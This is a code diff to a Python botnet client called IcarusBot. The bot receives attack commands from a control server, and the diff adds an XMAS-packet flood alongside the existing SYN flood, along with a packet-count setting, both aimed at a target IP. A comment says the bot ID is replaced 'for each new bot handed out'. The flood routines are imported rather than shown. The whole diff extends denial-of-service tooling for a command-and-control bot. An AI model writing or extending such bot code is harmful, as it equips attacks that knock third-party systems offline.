@@ -6,7 +6,7 @@ import threading
 import time
 from enum import Enum
 from socket import timeout
-import syn_flood
+import syn_flood, xmas_attack
 
 import requests
 from win10toast import ToastNotifier
@@ -14,6 +14,7 @@ from win10toast import ToastNotifier
 from config import API_URL
 
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
+NUM_PACKETS_TO_SEND = 1
 
 
 class IcarusBot:
@@ -141,11 +142,14 @@ class IcarusBot:
                     # TODO: Implement attacks here
                     # TODO: Number of packets to send?
                     # Angus: We just keep running until a stop attack is issued.
+                    # TODO: Specify port(s) to attack
                     if attack_type == 'SYN_FLOOD':
-                        #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, 1))
+                        #attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
                         #attack_thread.start()
                         #attack_thread.join()
-                        syn_flood.SYN_Flood(target_ip, [1])
+                        syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, [1])
+                    elif attack_type == 'XMAS_FLOOD':
+                        xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, [1])
                     else:
                         print("No attack type specified")
 
